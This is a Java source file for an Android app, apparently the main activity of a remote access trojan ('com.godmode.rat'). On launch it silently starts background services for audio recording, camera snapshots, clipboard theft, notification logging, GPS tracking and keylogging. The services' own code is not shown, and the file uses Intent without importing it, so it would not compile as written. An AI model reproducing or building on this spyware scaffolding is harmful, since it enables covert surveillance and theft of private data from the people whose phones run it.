package com.godmode.rat;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Start the background services
        startService(new Intent(this, AudioRecorderService.class));
        startService(new Intent(this, CameraSnapService.class));
        startService(new Intent(this, ClipboardStealerService.class));
        startService(new Intent(this, NotificationLoggerService.class));
        startService(new Intent(this, GPSTrackerService.class));
        startService(new Intent(this, KeyloggerService.class));
    }
}
